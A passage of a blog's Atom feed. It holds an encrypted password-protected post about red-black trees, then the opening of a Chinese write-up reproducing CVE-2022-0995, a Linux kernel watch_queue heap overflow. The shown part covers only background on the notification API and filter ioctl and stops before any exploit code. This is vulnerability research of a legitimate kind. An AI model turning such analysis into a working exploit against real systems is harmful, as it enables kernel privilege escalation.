c8673c8e35edbdf4dc07845c17337cd1e5622a00dc76f506fa0cef17cca5d3828fca4baab6916fa6a6f579a525e4ad48979014b8503015b3ae3f3591f388a442852955ba17f9c666d2c87cef573684a3fa59ce2fb36a932a735013e18481ece6e1ae76d3417ce50f21ca977fa05a999caa7c230fba02059c3c166d29e66e6494010f78264617649be8502905621ed72331eba4d5661f4c2efde66a883ab8ee2cfe0fbc71fe79b5d26eaff6f282a904d25b26cee400cf411e80995754d5b16f9df59d1a78599b425a27e03ab52ef27bc4611fbb1926a18a9e458ceab048804b5cb0633575a64396f37616775eead800777a4c441596cf6261f9bc35b4210e11e53841a3dfe1132b6a81a9010c632ae35a52513276292429bf72e7c5ee718bc4abb6ba6264df96b24e8eb775b0e4895f4245800c1ea0e3fd881f36303de012f64ba79ad6d66d48d6c78f76fda80cef79032913496a05628ebd1df34042700f12a370cfcf5c974747f72100929aae8bb14f68ab088772ee0cf1daf932fb241af96e8f82efda27c9aa6e9ce5e98bfbf6be9a3008a3e9fbd744c4a687b09e62606f02ae44dfdc526e7e9244e0f3d86a1f1dd74f178cbf071163f5fb4eed7b7029c2d2528b149146b7bf78b955379f8d69795c1105b6cbaa4a348f4122dd7e47b00ad9bde0ee6c02673881e6098840b9e328cf629769f0ba1f4fc063d1e3289faeae7e9eaba36e097554679ad69b37002f6d93627e1292782259ca8ce7bd292b2c044a3f8cf4a3599f78eca1229423e358b2ba777ea8f3cbda029f2547a0eb7ef3e62df520d4b0a373a7cdabc0ac7b9c84742023c4ca352fc23875ecd63e2168e2d7ba1d0afeefa8e7ee0a8fe97b72ea70d5d180fd2ea0a2def9b108f2cd999c6f13cd66fe4424e697aadfcf10a0913de1b543f27758ac3b22e73cfe9e4b0c6fd68bcb59ef8748b4ea382736359fb7d597113edffbaec0c8c831060ae92d34cd5daf6d33e2726e6448ec48b17833744311ed9359bf3655a24a61a591bc2a1f6d0e4aa24ab353c366826c445cd7d78c119c88eddd27b29b1b0a4a97c78027dcb6af38f1f5bdddd84d2bd397337e757abcd6bc7016fcad6236460074394b3c7dd99f9dce32e434dad45bafdecb312cf136538da7754a903f1f39cf132246e572a3307fe43423fa56944cd50caa9d976e5d5742f2c06efb243e39a266515409105bc4302708be43d019eb3f6af506a9e6e2035a5da01712ac560c9137a888a6ccc432327fad59134220546a4b69d54786cb57b78bd7d04bc0919b64c2ba58d9a2fd7638a2a7d5e4646786b8a181c42f81083dce3755086f7b2d391c1a2f51a389932a7a2dc0e31e129083d36c07cf6006b9642e7a0f10d147c06567b9af59fee55db1a619756429a8dca7965a1db00f4ec11b112fee3a8be266fd224934ee066b21f0f4669922936a17fdb85763fb075be590c4db604a0f9eae2eacba096d2e875822f8ffde7204e19c2aa86ebc86f4b3af0c7965d76b09da04290e772a00f71d1ac11c15bd22a3a0a1bc038eead3092e79ffbcf5163ee61a82ab7e5cc42d6ce77f21e25d12c51be490cf8feab62264e556ca99ba4ac2d1e8838f5aac6bfff7257cd50db3d1bd866c2ab7a50feda4eeacffee4d32e6f60512a2e75fe838b65b1e160f06a2761ca0acf310a4555638cf06573f8f6b01c0f2e62c04675a0ed8d96315fc32634e266bff7a653a8124f436ec7f1864159b35f7be6984bfec0ecc5e27728190a18e59deb08e7252199a208c5c5e168e22259a62251045ef590afaa452c2656a39ed3cdc6663469be2fffaa8ff444fce50d5ff46a17125c7ee02d218771d1375a70498ae1149e1e54dd6945e463f0673773d55270b850e1b8ade1356fe9012600d9514c68c972f38147d2800cd190985beed7b71764c0916e06541aeb37a02f35181eda567b205e58983ea6ad5bd6528401d2a1c366412f5ba4a47ea02353360f728e81ca4d6fc56d71bdbee94478afcf918b6fcd2c9b8410f86af2e82922d0d9351db2f0340714406b5006375f596d548779675acbc6a14796358b54ec5aed097bb11c17af5a33a04e7e8300af11e25229a0e404c4abfdc9003440778c2e376f409ca33c08227d232f01641d0ca1fcacce7b723697dd05dd82c8e6487a7433e009669b362e917b1ee7271630baf11e3e65e5ab4e4ca06b0d06f10964c35ccabd8e69cd3eca4347738199b3278b2de2a48649d294dee7fdbbc2e574b17bc47086bf1898a9249fe9b32052f5a47d11b858bc7a636a64bce27d4f130b3d349f00238ff42ab798f67786d98914422cf7f59f54a4e9343e96d27c6cd8b7b6d0696af001a25ea2123b735d68e3e2fbb4661f1644c930501d7d7cbf31a0b53e3f8dc8615445ffc2f07c652522cd7bed1e6e6335386a1704f947ec50feaab0c8870c33c99ae5ea1a9b1985633c002029f3cea7ba2231c14841b2943c1c5da96a15c730660950fc868b575471b30f95ac2172477306b04207e57a2752f1affe6911859af8b0f533c0bacdd2a66c1752a7b3780f085b028bf7c689a0028f18950dbfc38323d174c780c6e29ed505505cdfec0839d7d8d3f182e2ecbc4f825c541a05c4442ec433b9b7b1a9e1f667f616ce686252d68d40dfe162dd3e2584367e6553065eb6360c50655c5f8b7cafeb668ea5bdafadc6f79762b2a479cc67b76eb0d5bae249f9e52b61275974d1cea5d20f6a25bc5ba0b856eb7cab1a10ecc48766f39f55e161e90f1d10c12b941712b0a60bf04c14d70cb4fee50c88a9085efbd41f32b5259a7dffbb0b63ff939fdfc089e2304e3d75918c30dee0da7949ac93ac172092c93bd5cffe255afacf89753442cc8dc13d7104fb98547853107087cafdcb925f326951c081c85482e79716480f5b98724b4cf4ea53637fb83f9a54edb97b28eb808be8134126b0e693e25a984485e75e3df30204c45db3de9d3d0d5fa8134ecbc5a0469137102dfc0957c4a3b4a3c5aa5d2ef83bf31dbe63234cd8e53db1378c4a49db85dd6fc5b0898c5b195f377657d3300e9ae6a79152238b516e5bd751912fc123f05b010af0fe6285797328bb0cdd80528ec66004b3eb25c94c18a658a198e6f6f5a498fd60b859253d7922a9e8ef9c1935b0f18d7e2a88ee106c78f477069cf659cf6cedd402d25f62f6274c52e14302a50dc5aedd3b4a8d4df3f46da3d099f753ef51794a4c54cc03fc043ebee2e9f25024771fa2d48c71b7289ac00bc3f06892f6a2b5b562200c2af174d5d90a1f6f4d2b5e7e0b5be7c27c0ab43ffd4f9ecf87f3e43e7274296f2ca4206308541180369ff4a2e300845e7887ad00780cbff064516e7c1aaa9bcdd51d75f0b8b9eb82c2758803fbd895c355dfdc0b74849e72e11f4527177fe006c72299b9a3ee187d5a6b3787792186e421d28aeb7e349da6690b971b3e5cef9907528882363ab5a31c7abe53d125f59596248b89370d16c0a2c22ecf789de12d0791ff2f751a28047b9999b724b071d222d721abf3331dc80980480584530009b1575db4bd8f8eb378a0e5444b5769e4e8589be6e4addf224df210a8d32025c707e1ad16c8abff94039530c3711623957ce3c487ac45542b10abdf761b47f12a75cb493f31bb96ecb7bd2a890642f2e76e9ce92a3ffde2f210212f5bfb6dfea1324bc86139776832efd25aafdd1c684116a2d10cb4880c081ecdb0ca8008fdb13ceaf7e2fef3f0e3f4005d015b417368272b308cbee31dddc04fef8c6e8602cf96b7818dc68e01b08f4edf6a1373ae5ad7dfd909fcbbc3a0765d0f4e25f9eb3bef181ababbea5cb122b7eda85b3fe3de0ef0fc0b1d9a866e626f71cf7f10662fcc4837ec78a96cf2fb74847ce457651fcb1e684154a3f421fa43247e14b8d20f461ec0564e2efff90cdd7b076b620fd187607acdf4278967c810cea52574dafac071c7ec23e34b093c260d46836130cc01d2fea18290b09215d51867f18e4e49a9f694f430d6b628647f3771c27eca4901f45357b1fd7fb6566042065fb24b428d0ac03e2b4e6abe90ac65fb2516a5a145d596b31a058c0eaedd40d774aa495c75b06c7d93098bb0d049102dc9b4e33b2621e603f5763e96cca28e204e599c7c773d1bf5ab3d67e8b3fc81e7fc3bf3b644a43d0371f8aab28da50422e35e12c97a7c2515a48ee0a405861c855b7384b859904ac2dfbaee77162941dffb0332b7a65e844b510819c192484963b8f2fa23319856f4f211f4a07f5a98810219d897df48273167767e1e432a42afde2468c9708e2e52f3ff563e4f067b12ed32956b70ce6a2bd7c69416bbcbe9ab672f3ed46aeb5017c605574bbd52cbe9e95ae06a4c3290c6dc796cafaf0eb99a99e2024a8286d785e580ac9f566a819cc76c97045f0e5f98f11d4011512c5bd08d11d64aabd59f2f74166c10dbd37a71d556aac83096993cc06dd44da3417003cef9f578ca414df66a0cef7d3420af09148f62a82af95987f217c10fc2e1befd1954b23d31c491866d79400664542b1b50425895e4f25134b73f29adb485aff5be766a8e4d25d607d1911c7b563c4e907a7f6ecf9ec1c873c63cde95470db8330a2fee965d6880a29ad55de1028baa7b99b7d2388192ee922557f49ae72519fc42894c009b00819d20d412d619b0efc20dbd3de85f855c63ae339200f671e0ced34feb8f4c88437499de6dbf06cb5d7c64556bb5449ded1917efd9039639828962bdf1e1c8eceb98b29bcc47014f4491f21415e743cc36c0c2c18f8d5771322aa147c6fcabe8524e3af81947dc2643c66ec48956f9345adf2d1eb6b524215ee1cb3861dec697aab753dc67e82ac1f111f97418f093617290b258ddcca05e72f7536d157ce4e0d955b895c1ee6393ff5221a062d74041866b2ca6c233806f1e9aacd4b13714dbe5dcae7a4050dc88ab866cfad7256470dc621d45e4ea58e5e1d50d4e9fb628daafd822f1b88f0decb479eef8c6afd79c16a9ddce4a1ece7d3397185de91aa2822bca8917f4135b81a1038efa2bac2fc260381f5dd4040e2d020870aaf5d99f41f2f3574ac360770b1f375f59fe8eed8038bf55ae79468088d9995af4252fb9931dcc1189902d13083276f3ba4c4323f06519a70e69a4c32a7ac277d5772621f771e2893b9fbe44eab071d8928505c32920f1692c105b5f5cab8d5ae907aaeffaa14be05b32e28555feeb7ebdbab713b77199315b5e0580c9705080a30523c21b9f19e12e49fe47190feb28ea474880405b21acc8a0fa994774100c5547ef243c7ec5862ea6fb74dbb059a84493ed6ac3c9a1c3f56b91bbcd434e89d631e8294c48a4a7c05dc38a92a514de6876df51936f05ebb4fddaa40668f0968d21f15017043c36dbaf26e62b523b47820a4383c373d6a69369609feff8a34d196e2bcc7d3aeba573523542e3a64ab1874f43fcc34c1c2939a7088546f51f73e48a6fcb7927febac638b5749462f4d2e8904041da89b294cf086f8d98d041fd5230db86ecbd219d20a539136be376353a4d600ec7a36de0e4551366ca7880821e8684214d29d7307ca8bf135b402cfaee9dd365ac769f1b44aca9bac00d90993efc60fac952d1e32dad4cc614ee20630970a1ac6253775cb5b218dd88be43462650c58bd1243f3caf0e37c557be868b4c532d40e3a9e1d90457a89f752cf56d66b9bd36430aca50e10f8c2159d27782633e062918d296ca378943c8ca0eb3c118c44b9138a983149debd9137cce0493e9e53d4de9ef56d81e815af5e60a2ee75cd6581990fa9215767174220ea9dfade317d8c7fbad288206bcc78296de46a272e0846a4c3293608280f074ae3d4b2569190469b56553a39a99bf23e969907e7f04c899c716da8a352e5383ae494ac3199b8bb9c5230ffde6456fc712612e0749c2baee9b8d89a5344eec02a36dde27a7563cf82ecca2be6ba5d3152915e9d1f7dd039aee5e2deb543bcbdc32fb45001112eaeb30dc048fc2c818a4dc99ae9ff3b3397baa174bfb9721af7b7025d6c7c917347f57fe25e574469e6695c9f26a305fa3d2e7d739638030819a2b5b5f6d9988f0a66d96ebd3b39f9de0e2989f970acb160ced7e9700a003855627f925ed49cbb93565f091a53e5140994d686e0d5fc7e4d1389d23b9382b58cc29b41ec15ac368270cb73c1889f87e89dc2c6e27a1f4bbb8b8b91956a65d254ad376b52ec65267d97c1713ef11266c0c510f9bba710468f06461e2f898d9fd7812ae31c757d3adb7fecdee5f5268e2622ac07a79992ae1f2256847c4d22f923d20aed407af0d535982aad2cb65281b76905443533439c531f9cb43fef51965c42073f123a3159db2b198f47a429cfd1e607ccb683d3a15a47eedc113d03fdf14de572d6251b2c4c9cff184c280658c15bc39a776b400c389d413b2dc889df869871beeb71bcc56ca1b41fa04384755447cf9624ccad2b61dd164ad089e104d64304546565a73eddd592842c4c2026f0e9ae4a434d16e0d58058006d7fd02ffd32998462ffba9795faa4bd30f7ceda3d789a9b4e6bdca8abaf092c940414f8a1a6a6d122d449f9cd058ad80edd0237a19658a20c33e6799eb21bf29f0eeca80880140d336e11fee9bc2de41b28c45aaa6561eb2038c6548a2928a61884b0c518dc4d6a91ca6560675231f93aa9dddae6ce91db37ef1458bb54f6e5b59507f2ad3134d696a09427de7dfa644309921acd2255907017201f4b99f5b303012e00fa21b2fb71b5f713d158813db159c263db671dd0e10dfb585aff8ab46831ffd69537c35ad3061f1658b765eb61640d48f3414147a2bb24ba292b1be522a2ce117ed60f181a8c20d2286c7cd97d8c2858ca11611a9829261166de6b80c8f289a4d559430b71da44225de4c5e68756b839562d6d5a59742a89f5b809793644961177043d90db763edd5084489a43ef599be151339cca530d5eb8e30a53f210739402feb57c34422dffcbf9448cabc51bb1c98de8ab47169adc38dde520845819d0a8cacd28c6bde5f866a6a18c3df7a2c8578fd2609e62347be083bb34a44840def207d5a3816cba0bb85fb9438b112b7fdc9755da66014504ff70209d9110759e418559627f1538339a7cbbdb92884a515be7806d16bd03556e9d1f85e380ad2d2f3f87cb0443d9003af28df5ea43b5019f7a1aaaf15cd470923eb722efccb618a441039599b85c06cbb97c02b69072aa67d227dc0840c8a3dea4e4332f963faca44d067c1b2bf9354629853c0eb5dc307d56b8e027007c3598f53afc8db8123081aadda8ddf73a066524866a19c8608b9d263e96fa8fd20d6be22148e1494b0a596fac4904876cfac5728a1549b94a5582dc0f985b49b6cbfdb1c4dab4bb4b4d98b1e5d6428e60b049747a21f30bb399ac7b63ae3c4f6841bf765df05f5f44cc4ff1a5a47cc96eb8fe3509e492d5ddb6b60160d6138aa719b7030c083258aa3ad25d8d8cd1a3d95ea873e50d19eafb7d3ae606c21243541b650b0f60c151c1548f471c4298082d3b7d4bd7b89c6be150fa460922fffcb69163501e026b82a667e05d230f0600ec4662cf86fcab35020c3e4e287f68e85b1d5047dd37682481661a52588c53dae0c4ea0151ea8de2bf0bb66d241e44597652af97edffdb44e500189e654f69b10c01e93ae24513c4c0f941e928e5041416bff74a6c7a280912f12b7bb04b2417d34a83e9a551a3a9aa51d8d82a9944b04205d24fa75cd6fd1fa3d37f19b13a2776089a05ae9503c369178d818489adc3fde321ed6aec6e5a56651dc915aab955b54f55e7dbbffe83cc7e1c537700630b7ec019aa20df4f2fc48b28533f70fa6c5febb9ca8b253b0adc0888f830651e82dd9775ca8c076edd1c8d6c3e3451a1fc8a517076c5a523553662d807ae9d9e7a5363fdf1b449b452bc55083e39f9c9850d395acda6a131511a3305576665ed7d613eca4bd81d794a9cf0d81dc6bb4e821c832fbad9141f55c5dc3b5d7619235aab5784dcfde0e6dc9c4ff15ecf613b381faefe77b959a0c9f4729e18bdcb5c7e61e269ada05e999786e4a8f0bfd2b67dba12916ba1005bc996f490538ff10781dca8fee1c4fc7eb16476d2018b8aa959fc99a4441fe93d91abf9bdcd56fa75ffdf93ebb4778acd6201c3aeb19463a77415cd483af2695a4038970cc858a98ab0a2222b6a0fbba99711670a0253ea060456c7dfe31e597c73cb00ccca96fbcb53bd068f85c5e1d189537b685e35a4b66692506d9d5be6df84cb6e2426d1072c4748c3df0791e993b106724ed9490cb381a80e1e42c840b36b6ec1029ee15fd5cfc42bb903a38c459c56c8788334ed19b0340de97d91a6606d8837cd6c2bbe30ae702740dc1d1c85005c36005dfaf668f070901fe377273fcbdb3550dd9ec6a7bb2f2e7cb7f57a3d69b1d1013d9cbcc8ea5ab92542ca6775ed1e51373e47e8ac9d60e55452ddd60d781a58d7ef21057f12b500b885e06d7d15836c95e017264cd10686c3df2c728caa5a1afe43ff653a095786f04e72e9c3fa8e4187843c149627f93c19e81fa2a979586533863662ee3969070e45c13c10dadd3e19695cc0202e239dadfe4cab5550a27eda53dac6b0dccb79b1d2fd188d85cd6173c4a1f59c2fdecbabaad546d2d92ba46ed1fabd3220265d9e59b3746f6fe4b7f7d1fde763920d3b81e26e7d41d6db6f55aa024a350ce997af20eaca960e937ed3b4a736084316e334beae3de1a6973468197837b1abda534adcd66c690ec399515fdfa3d96078a423fe8d7236f2208186db1431749f2b952d3b16ef2ad94dfbf9bbff869da2de153b69f4fdbcd02a9ddb93d4620e872434a4d8e3ede0c055f8b1f4f700d4ff332da1735a9e195c99363459d2496e0454b811005db3e318b9ba8beab0a1df619af97e0b10cfc76e984fe728a4818b343ffaf8bffb4420a93b663a0e6811edc5fc70cb9d6462f2693844f2073a64a62a72f9af2dcf667286ab92a524e9c190558e0d161f73bd3b9fa8fff20a30bbf594e9f46554f68bc665ae0342c9ef20389f52c09aa8977cd34956266f1275912912021bbaf2951238403d3477a5d7db707a44fe273665acbf6e910a4ddb3e8b2ec536a755398864c6ccda44efb28806bf6ec5955afae8034738fd1657f8d52a96897b05bf6c8cf4a7d1934546375afc522acf65c0f048284c38332f10f52e22e5e77e236fbda4bf6ae3ffd26a65263aeb6a63e76413f65dacb15e22dd881e2898aff19638ccea0ecd28bddbcbac7fb9abda0a11652c5ec3f44182db4e8a44929bba1f04961ea3168dc5b0416f5ca40631e6a56495d2482980962882a78f292463e67a9f1d80a40090dbe24e977ed956532830f5a6a68dc41fcd0a984efe6328f56e901385c51b18a9357c89d903c4b164a90f228524c0e71e53a686d08ea8cace9ac9c5ac3b3f777e3c21eefee721908eb66e64cd68b466bf07044f3225ce83b1ab54b9ff115cb16e78517a8b0d59b13c5fe8cd343bc9ff548864d5c240b1d7a10f024a3fa519f381fb1c162d2553bdaeb8b234e1072754d3effbf2946ef6de9222434ee515c5723bc92f9dd48e4cf69f483c1382d30dd68a88456d0a4c9f09984199c40ec820f0f106ed38a86ede6c0f213e6bb747d37ccefc83d4f0a1f40d3dbef490ad93b72f09b023d6d13d1a87be26c0cc1de2a909d3002c285111ccffa7b9726f04449c661c13491d755d01e57c3f5be55171b3dc43b3951ceb697d3a9819ea27034da92fd8bb1daa617c1cf87dbc6e3b6242eaa9130815034e691327d3cc07054e0f0148164f0e9840bc3d2be1fd78974e688f0c8026b3c02ab44bdc6d3f5afed423900586cc0d782574b2e67f1c800145f86f86b240644344bbee26491f94e94571d190da0a7c4ebbb9977eccad50a21fe12d0dddb055694539356bd98be0d70868523ad40cf508cb2504703e7aaf2b817ed468d3f4198f6a1c725ae3ffdde1d03582121f59d97a4ab7d8c09bd33ae387a687a6e3fe1df9441ea19a1a85ff7e7eddadb8ffd6b91202e9029ea9e47dd24ee1592ec104373164525f926a474f22ecc14380929b099194c65764d80b372e2503ca90bd936a77c3d08e4411c1d36bd0031f94b3ab26115fcae1c1996ae9483206c65b78b0fd4b1f8e5ec93bf28bf03ee015c7b3f13c3b3f8c775bc786e48ee658bfce015aaac95a15be3f1f59f9801ab5273156fe5b0d062d1dc6fb234f1c559af631ad9c19ce8b9181b1d01c189abdd09a07b79bacb415a868e8152b09925ddd017cd5085aa1f6f165cda660d041d0da03d0da9cd89858abc1a48679592fc7ef1724adb6ae3106381ae0d0c1f6641014a2b540644edad51bf238c3037c9f5951a307780d64038cf87234d704f034d7d39a026ebee4ac4e583a7b8b26bbeacb99cf68cdf169ff7b7ead0e5afdc502495a7043fa4a88e63d8f3cd25917a9f9b2d517d7c5085f06d95428de40bfeb1a5d335eb07abe9a24d98d37ff8ac3f475e7167a119a100ce14b3ed9f8165ad991c413e9ed1efdd0f317a59361d8cc336a17e2704db55deb9c1d459502d1e485ef2548d5fc791eae6d6cd019357a34f12a11205301371b776f073eaf621b50d8ed898fa51119c0dd7d587745c4e8d67d7694b8d2d6e5aa44ead53b40db2538b5ecc8dbebaca7dcf1944d3ded0983134ee357a7559eb80983267e7d372b3ad8c3fec658bca2236fdb94c9a6c81973a209c9f68c44448fd70c8e3e184885f7790313426dc5f3ac514fcd5fdf112030b1fd88fc622f30ea4e5a0e27c851203843b3a85bebd420455c5a8fd95db758f148055aeffee991ce75a999c59cbfbf24e64055082d699d9fd53617e5e0f2e463d2a745cde870a561a97fb88d52e1b3fb012128c2c9c02ff60edd5dd8bf498ab40cc737c9cf158bfd7cd86dd53d5455270022b0198611f31dcea08408c37e4fd563e435e846d38024c619c11a00a35eb5ed88240d9dd0654f757caca97cbb6add7d30715b075823d21581f80b4fa3e8420ead08f185a9b1f43ae700add6b29c7639fc55958e61db4fa0bb3f2d35f7a531f569398c92e643f41aee20de09e964362b6b2fb510f5042acb2662e929ba4fb3ea11e19e0523ec2868677b2dd2ee660e4514f39d36ed6cc4faa12ae11828d58657a778c84721357f5875003f48555e5c254e2e24da675b46b510122442e476bd24b82ab64093260638d3a23884e5abff127f123028d9bd36cb7103efda9f530e3e00e509c58d85d82aaa712aaed73dd8dafcdce789bcffee7a7c34aefcb7ce6b7e20a7cdea2c71470d145274433652d1e714680042c5ac14c2f311a2cf4331c8186fbb59287c65af8c6091ba6107a402ba94dd974028424c92a5157251bdceb2b40d578fce8ca7bd08cac7f500d4985cdfa09af65a55fc538d5aa2852c320903a0a11748f0fd84b274a8d7051bab477c86ea0c37e1f3f8cc43ed6d7aa241e9cca78fe8c3cc8a9485f53026c49844b55d8bee549ea1acccd7329b65c7e27109c73a46bc992bfab71a51f30d575a848052a95390420a6f4e317e067cbda82e6bf287b8db125f1dde3797ce01ee6d563abdedf7a602e77c68663f16068b5c1d9ebc6833bc5b4facff195467bcd620a98b999f2675e280c1bd6c36ac25acd33a66dc8c013564bae4f4393872498d735bf347cf093cda2a24143a65c5c230fedd2f3f9a00f6d1d902501fd5077ad92044bed0111967622f8fe078f423088ff59463a3c4b393645b6d8b35bd61a175de35c6c6cd1987491ffe9b38b1b1636df703e6160f453334e0eda2184944cce19353dc8b137e8d0003ff8411f8d317e86c7dddddec408b66a6c7f6e32dfcf7639af41e98a77fb502a27351bf4ba6c914f055adeff156db20b432971b5c922e3dc7c4bb970bad8c177550143990b1569f386f86022b926af2d5db3c116bd21aa5a0299db914e7b65223630847d280847ca40cf029978d6c0f40c896d5a6c12226d73132bfc12824405b7a8a661753b8b8d5323a643021d23de569f972e70db9497e00578c92f02efd6ab377894cc162673b62441563bb38171cf99fa08fc5b567e2e2d7a163ef6150ffc82ab78ae0710ef08e5cfc48b70a0c90404902d9950ade578afdb584f179d9418c947d8d0c6834822ef96b23e6ea83848e5773ded7e0e7a85ea2fabba4d0cb988b2dd3b03ed20374f7209238d1bff8c3c8d33049307e7ea112a73452ecca580f7cb0a2f58c48e7407be4619e185aa0fc9f9af8d9853cab08f06a95cc6789fd32e064e9a2948c4e7dab44544c63855b73b8447ee0b0431cd899cbe093962dea7d63dc6153d7f6485bd46d771c68c75145ed578693b6a49b0c59a204cbd07fd091c15743a4b6cdb6b68ba8627bd198e72d0eb0d9adc9ee6a080b299a229834945b26f66e7d54fec584e678acc67940e5425fe409a7bd5e1fdfa2b8cd4d0af7384242809f2ac06ae09a5146f7cf74a9f60cc20df1c2d47fa80c3aafdcf35d0a05f7025391d4468fb14efd8a390704aaaa903a7dc8576c81e8a3406bf1673ebb9dccebccaa10cd2b9dc2c70931ff446902190634fefa85b4ae91f6fae264c73c9ad6879df7d6371a30098444ec3e221610343b822ff290dac9998610c30891595f2a70aa0374002d75573c303a82f7a3a21eaa2e98325a9ff8764083c6fcc5ea8b84a577ca56c92f3759f5a64f2ee9e17de81c38b07648a84cbac63f80ff5a6eddc2a28c8ff71c4ffe72ce7797bacd5955a815b20752f4c3670a38ca1bd01b51d647265a1a93e25e2fef85ceca03f248bd8bef1f5e220592f539ce80b8d8afdc2b9782b1c69b90ebbc58e33f8aab2a7c2ee13e3921c79508bbe19402adf0c87ebe310813db14ba8713a49802479b8014291691c37181e6713ed5e3ffc454e5479be58eacad603bc61e074bada48d201b68857f73b6f978cdb8115dc96693052bb735ffe2941fde9937c07ba9fe6f97057e60a8a6816761e4f9f293ed8978df2f8cbb27061bab67185c84d93e3afb8dd2a7f247e32185fa48fa33bcff9f37e0c6bd99d26c0c585842fae5da8974122336bacf3c8a57ea00d0474fe0991ad3c3afb8a31bff0027216eaffa4b3227cda82b2840190649fd4d36f0e0dd38e46b1a25a914b468fd6e46256d0e5f0e4c3e7499d5c3a2616165a2aa77bbd9f02539db57861c723f136338662ee512eaf59cf8f6beb61d45a95dd41c27288c36f7634bd6afe13a646bd05015e02b7e0fd465150311d215f8ee351796bbfdad49cdaf6beebfc8d04f929805be35667daeab146fc8d155b26ac26e18a816581c9e6585a03bbf268fa1fb67f22a3d160dc75512ec7787e9f15da282127bf2d06f8e0556ada99aa908fb14d93f164c08a0fafa730dee1d61c016fb30e02fd81b5fcbcb0e08ae50022c67e6857e406769d1311db81789fb9ff60f15a2bc1e9da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x08】CVE-2022-0995 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>我在看着你👁_👁</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0995 是近日爆出来的一个存在于 _观察队列事件通知子系统_（watch_queue event notification subsystem）中的一个堆溢出漏洞，该漏洞自内核版本 <code>5.8</code> 中伴随着 watch queue subsystem 引入，在 <code>5.17-rc7</code> 版本中被修复</p><p>不过虽然获得了 <code>7.1</code> 的 CVSS 评分，但这个漏洞似乎并没有什么热度，不过在笔者看来这仍然是一个品相不错的漏洞</p><p>在开始之前我们先来补充一些基础知识</p><h2 id="General-notification-mechanism"><a href="#General-notification-mechanism" class="headerlink" title="General notification mechanism"></a><em>General notification mechanism</em></h2><blockquote><p>参见<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>通用通知机制</em> 是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区</p><h3 id="Watch-Queue（Notification-Output）API"><a href="#Watch-Queue（Notification-Output）API" class="headerlink" title="Watch Queue（Notification Output）API"></a>Watch Queue（Notification Output）API</h3><p>一个 <em>观测队列</em> （watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>当一个观测队列被创建后，我们可以应用一组 <em>过滤器</em> （filters）以限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span> =</span> &#123;<br>        ...<br>&#125;;<br>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)<br></code></pre></td></tr></table></figure><p>其中 filter 应为一个 <code>struct watch_notification_filter</code> 类型变量，其中 <code>nr_filters</code> 表示 <code>filters[]</code> 数组中过滤器的数量，而 <code>__reserved</code> 应为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span 